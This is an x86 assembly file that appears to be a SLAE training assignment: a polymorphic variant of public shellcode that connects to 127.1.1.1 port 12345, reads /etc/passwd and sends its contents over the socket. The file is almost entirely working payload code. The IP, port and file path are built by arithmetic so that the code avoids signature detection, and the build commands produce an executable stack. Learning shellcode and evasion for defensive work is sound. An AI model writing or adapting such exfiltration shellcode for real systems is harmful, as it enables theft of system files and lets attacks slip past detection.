; Title 	: SLAE Linux/x86 - Assignment-6.4
; Description	: Polymorphic version of Linux/x86 - reads /etc/passwd and sends the content to 127.1.1.1 port 12345 - 111 bytes by Daniel Sauder
; Original 	: http://shell-storm.org/shellcode/files/shellcode-861.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 128 Bytes (~15.3% increase in shellcode size)
;
; nasm -f elf32 shellcode-861-poly.nasm -o shellcode-861-poly.o
; ld shellcode-861-poly.o -o shellcode-861-poly -z execstack


section .text
global _start
_start:
    	; socket
 	push BYTE 0x66    ; socketcall 102
   	pop eax

	;xor ebx, ebx 
    	;inc ebx 
	push byte 0x1
	pop ebx

    	;xor edx, edx
    	;push edx 
	cdq
	push edx
	
    	push BYTE 0x1
	push BYTE 0x2

	;mov ecx, esp
	push esp
	pop ecx

    	int 0x80

    	;mov esi, eax
	push eax
	pop esi

    	; connect
    	push BYTE 0x66 
    	pop eax
    	inc ebx

    	;push DWORD 0x0101017f  ;127.1.1.1
	mov edx, 0x01010101
	add edx,0x7e
	push edx

    	;push WORD 0x3930  ; Port 12345
	add dx, 0x37b1		; dx = 0x017f ; 0x37b1 + 0x017f = 0x3930
	push word dx

    	push WORD bx
    	mov ecx, esp
    	push BYTE 16
    	push ecx
    	push esi
    	mov ecx, esp
    	inc ebx
    	int 0x80

    	; dup2
    	mov esi, eax
    	push BYTE 0x1
    	pop ecx
    	mov BYTE al, 0x3F
    	int 0x80
    
    	;read the file
    	;jmp short call_shellcode
    
;shellcode:

    	;push 0x5
    	;pop eax
	xor eax, eax
	push eax		; null byte to terminate our /etc//passwd string
	mov al, 0x5

	;removing the jmp call pop
    	;pop ebx

	;"/etc//passwd"[::-1].encode("hex")
	; 6477737361702f2f6374652f

	mov ebx, 0x54676363
	add ebx, 0x10101010
	push ebx			; 0x64777373
	;------------------
	sub ebx, 0x3074444
	push ebx			; 0x61702f2f
	;------------------
	add ebx, 0x2043601
	dec ebx
	push ebx			; 0x6374652f
	;------------------
	mov ebx, esp

    	xor ecx,ecx
    	int 0x80
    
	;mov ebx,eax
	push eax
	pop ebx

    	mov al,0x3
    	mov edi,esp
    	mov ecx,edi

    	;xor edx,edx
	cdq

    	;mov dh,0xff
    	;mov dl,0xff

	mov dx,0xffff
    	int 0x80

	;mov edx,eax
	push eax
	pop edx

    	push 0x4
    	pop eax
    	mov bl, 0x1

    	int 0x80
    	push 0x1
    	pop eax
    	inc ebx
    	int 0x80
    
;call_shellcode:
;    	call shellcode
;    	message db "/etc/passwd"
    
